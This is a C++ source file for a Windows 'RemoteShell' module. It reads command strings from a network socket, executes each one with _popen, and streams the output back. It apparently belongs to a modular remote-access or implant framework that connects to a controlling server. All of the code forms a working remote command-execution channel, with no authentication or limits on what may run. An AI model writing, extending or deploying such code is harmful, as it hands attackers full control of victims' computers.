#include "remote_shell_module.h"
#include <iostream>
#include <sstream>
#include <cstring>

const int BUFFER_SIZE = 4096;

RemoteShell_Module::RemoteShell_Module() : shellActive(false), clientSocket(INVALID_SOCKET) {
}

RemoteShell_Module::~RemoteShell_Module() {
    stopRemoteShell();
}

const char* RemoteShell_Module::name() const {
    return "RemoteShell";
}

void RemoteShell_Module::run() {
    std::cout << "[RemoteShell] Module run() called - use startRemoteShell() to begin shell session" << std::endl;
}

bool RemoteShell_Module::startRemoteShell(SOCKET sock) {
    if (shellActive.load()) {
        std::cout << "[RemoteShell] Remote shell is already active!" << std::endl;
        return false;
    }

    clientSocket = sock;
    shellActive = true;
    
    // Start shell session in a separate thread
    shellThread = std::thread(&RemoteShell_Module::shellLoop, this, sock);
    
    std::cout << "[RemoteShell] Remote shell started" << std::endl;
    return true;
}

void RemoteShell_Module::stopRemoteShell() {
    if (shellActive.load()) {
        shellActive = false;
        if (shellThread.joinable()) {
            shellThread.join();
        }
        std::cout << "[RemoteShell] Remote shell stopped" << std::endl;
    }
}

bool RemoteShell_Module::isShellActive() const {
    return shellActive.load();
}

void RemoteShell_Module::shellLoop(SOCKET sock) {
    std::cout << "[RemoteShell] Shell session started, waiting for commands..." << std::endl;
    
    while (shellActive.load()) {
        std::string command;
        if (!receiveCommand(sock, command)) {
            std::cout << "[RemoteShell] Failed to receive command or connection lost" << std::endl;
            break;
        }
        
        if (command == "exit" || command == "quit") {
            std::cout << "[RemoteShell] Exit command received" << std::endl;
            break;
        }
        
        if (command.empty()) {
            continue;
        }
        
        std::cout << "[RemoteShell] Executing command: " << command << std::endl;
        
        std::string output = executeCommand(command);
        
        if (!sendOutput(sock, output)) {
            std::cout << "[RemoteShell] Failed to send command output" << std::endl;
            break;
        }
        
        // Send end marker
        std::string endMarker = "<END_OF_OUTPUT>\n";
        if (send(sock, endMarker.c_str(), endMarker.length(), 0) == SOCKET_ERROR) {
            std::cout << "[RemoteShell] Failed to send end marker" << std::endl;
            break;
        }
    }
    
    shellActive = false;
    std::cout << "[RemoteShell] Shell session ended" << std::endl;
}

std::string RemoteShell_Module::executeCommand(const std::string& command) {
    std::string result;
    
    try {
        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            return "Failed to execute command: " + command + "\n";
        }
        
        char buffer[BUFFER_SIZE];
        while (fgets(buffer, BUFFER_SIZE, pipe) != nullptr) {
            result += buffer;
        }
        
        int exitCode = _pclose(pipe);
        if (result.empty()) {
            if (exitCode == 0) {
                result = "Command executed successfully (no output)\n";
            } else {
                result = "Command failed with exit code: " + std::to_string(exitCode) + "\n";
            }
        }
    } catch (const std::exception& e) {
        result = "Exception occurred while executing command: " + std::string(e.what()) + "\n";
    }
    
    return result;
}

bool RemoteShell_Module::sendOutput(SOCKET sock, const std::string& output) {
    if (output.empty()) {
        return true;
    }
    
    int totalSent = 0;
    int totalSize = output.length();
    
    while (totalSent < totalSize) {
        int sent = send(sock, output.c_str() + totalSent, totalSize - totalSent, 0);
        if (sent == SOCKET_ERROR) {
            std::cerr << "[RemoteShell] Send failed with error: " << WSAGetLastError() << std::endl;
            return false;
        }
        totalSent += sent;
    }
    
    return true;
}

bool RemoteShell_Module::receiveCommand(SOCKET sock, std::string& command) {
    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);
    
    int received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    if (received <= 0) {
        if (received == 0) {
            std::cout << "[RemoteShell] Server closed connection" << std::endl;
        } else {
            std::cerr << "[RemoteShell] Receive failed with error: " << WSAGetLastError() << std::endl;
        }
        return false;
    }
    
    buffer[received] = '\0';
    command = std::string(buffer);
    
    // Remove trailing newline/carriage return
    while (!command.empty() && (command.back() == '\n' || command.back() == '\r')) {
        command.pop_back();
    }
    
    return true;
}
